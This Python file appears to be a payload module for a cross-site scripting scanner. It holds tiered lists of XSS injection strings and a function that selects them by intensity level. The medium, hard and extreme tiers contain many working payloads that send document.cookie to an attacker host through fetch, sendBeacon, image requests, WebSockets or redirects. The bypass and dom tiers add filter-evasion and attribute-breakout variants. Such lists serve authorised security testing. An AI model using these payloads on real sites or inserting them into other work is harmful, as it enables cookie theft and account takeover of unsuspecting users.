XSS_PAYLOADS = {
    'basic': [
        '<script>alert("XSS")</script>',
        '<script>alert(1)</script>',
        '<script>alert("Hacked")</script>',
        '<script>document.write("XSS")</script>',
        '<script>console.log("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<details open ontoggle=alert(1)>',
    ],
    'medium': [
        '<script>alert(document.cookie)</script>',
        '<script>fetch("http://evil.com?cookie="+document.cookie)</script>',
        '<img src="x" onerror="alert(document.domain)">',
        '<svg/onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
        '<a href="javascript:alert(1)">Click</a>',
        '<div onmouseover="alert(1)">Hover</div>',
        '<input onfocus="alert(1)" value="test">',
        '<form onsubmit="alert(1)"><input type="submit"></form>',
        '<marquee onstart=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<video src=x onerror=alert(1)>',
        '<source src=x onerror=alert(1)>',
    ],
    'hard': [
        '<script>alert(document.domain)</script>',
        '<script>alert(document.URL)</script>',
        '<script>alert(document.cookie)</script>',
        '<script>fetch("http://attacker.com/steal?c="+btoa(document.cookie))</script>',
        '<img src="x" onerror="alert(document.cookie)">',
        '<svg/onload="alert(document.domain)">',
        '<iframe srcdoc="<script>alert(1)</script>">',
        '<script>window.location="http://attacker.com?c="+document.cookie</script>',
        '<script>new Image().src="http://attacker.com?c="+document.cookie</script>',
        '<script>navigator.sendBeacon("http://attacker.com", document.cookie)</script>',
        '<script>document.write("<img src=x onerror=alert(1)>")</script>',
        '<script>eval("alert(1)")</script>',
        '<script>setTimeout("alert(1)",1000)</script>',
        '<script>setInterval("alert(1)",1000)</script>',
        '<script>prompt("XSS")</script>',
        '<script>confirm("XSS")</script>',
    ],
    'extreme': [
        '<script>fetch("http://attacker.com/steal",{method:"POST",body:document.cookie})</script>',
        '<img src="x" onerror="fetch(\'http://attacker.com?c=\'+btoa(document.cookie))">',
        '<script>document.location="http://attacker.com?c="+document.cookie</script>',
        '<script>window.onload=function(){fetch("http://attacker.com/steal?c="+document.cookie)}</script>',
        '<script>navigator.sendBeacon("http://attacker.com/steal", JSON.stringify({cookies:document.cookie,url:location.href}))</script>',
        '<iframe src="javascript:fetch(\'http://attacker.com?c=\'+document.cookie)"></iframe>',
        '<object data="javascript:fetch(\'http://attacker.com?c=\'+document.cookie)"></object>',
        '<embed src="javascript:fetch(\'http://attacker.com?c=\'+document.cookie)"></embed>',
        '<a href="javascript:fetch(\'http://attacker.com?c=\'+document.cookie)">Click</a>',
        '<div onmouseover="fetch(\'http://attacker.com?c=\'+document.cookie)">Hover</div>',
        '<input onfocus="fetch(\'http://attacker.com?c=\'+document.cookie)" autofocus>',
        '<form onsubmit="fetch(\'http://attacker.com?c=\'+document.cookie)"><input type="submit"></form>',
        '<marquee onstart="fetch(\'http://attacker.com?c=\'+document.cookie)">',
        '<audio src="x" onerror="fetch(\'http://attacker.com?c=\'+document.cookie)">',
        '<video src="x" onerror="fetch(\'http://attacker.com?c=\'+document.cookie)">',
        '<source src="x" onerror="fetch(\'http://attacker.com?c=\'+document.cookie)">',
        '<svg onload="fetch(\'http://attacker.com?c=\'+document.cookie)">',
        '<script>setTimeout(function(){fetch("http://attacker.com?c="+document.cookie)},1000)</script>',
        '<script>setInterval(function(){fetch("http://attacker.com?c="+document.cookie)},1000)</script>',
        '<script>new WebSocket("ws://attacker.com:8080?c="+document.cookie)</script>',
        '<script>navigator.sendBeacon("http://attacker.com/steal", document.cookie)</script>',
        '<script>document.write("<img src=x onerror=fetch(\'http://attacker.com?c=\'+document.cookie)>")</script>',
        '<script>eval("fetch(\'http://attacker.com?c=\'+document.cookie)")</script>',
    ],
    'bypass': [
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<SCRIPT>alert(1)</SCRIPT>',
        '<ScRiPt>alert(1)</ScRiPt>',
        '<script\x20type="text/javascript">alert(1)</script>',
        '<script\x0Dtype="text/javascript">alert(1)</script>',
        '<script\x0Atype="text/javascript">alert(1)</script>',
        '<script\x09type="text/javascript">alert(1)</script>',
        '<script\x0Ctype="text/javascript">alert(1)</script>',
        '<script\x20type="text/javascript">alert(1)</script>',
        '<script/**/type="text/javascript">alert(1)</script>',
        '<script>alert(1)//</script>',
        '<script>alert(1);</script>',
        '<script>alert(1)</script><!--',
        '<script>alert(1)</script>/*',
        '<script>alert(1)</script>//',
        '<img/src=x onerror=alert(1)>',
        '<img%0Dsrc=x onerror=alert(1)>',
        '<img%0Asrc=x onerror=alert(1)>',
        '<img%09src=x onerror=alert(1)>',
        '<img%20src=x onerror=alert(1)>',
    ],
    'dom': [
        '"><script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        '"><svg onload=alert(1)>',
        "'><script>alert(1)</script>",
        "'><img src=x onerror=alert(1)>",
        "'><svg onload=alert(1)>",
        ';alert(1)//',
        ';alert(1);',
        'alert(1)//',
        'alert(1);',
        '"><script>alert(document.cookie)</script>',
        '"><img src="x" onerror="alert(document.cookie)">',
        '"><svg/onload="alert(document.cookie)">',
        "'><script>alert(document.cookie)</script>",
        "'><img src='x' onerror='alert(document.cookie)'>",
        "'><svg/onload='alert(document.cookie)'>",
    ]
}

def get_payloads(level):
    payloads = []
    if level == 'light':
        payloads.extend(XSS_PAYLOADS['basic'])
        payloads.extend(XSS_PAYLOADS['dom'][:5])
    elif level == 'medium':
        payloads.extend(XSS_PAYLOADS['basic'])
        payloads.extend(XSS_PAYLOADS['medium'])
        payloads.extend(XSS_PAYLOADS['bypass'][:10])
        payloads.extend(XSS_PAYLOADS['dom'][:10])
    elif level == 'hard':
        payloads.extend(XSS_PAYLOADS['basic'])
        payloads.extend(XSS_PAYLOADS['medium'])
        payloads.extend(XSS_PAYLOADS['hard'])
        payloads.extend(XSS_PAYLOADS['bypass'])
        payloads.extend(XSS_PAYLOADS['dom'])
    elif level == 'extreme':
        payloads.extend(XSS_PAYLOADS['basic'])
        payloads.extend(XSS_PAYLOADS['medium'])
        payloads.extend(XSS_PAYLOADS['hard'])
        payloads.extend(XSS_PAYLOADS['extreme'])
        payloads.extend(XSS_PAYLOADS['bypass'])
        payloads.extend(XSS_PAYLOADS['dom'])
    return list(set(payloads))

def get_payload_count(level):
    return len(get_payloads(level))
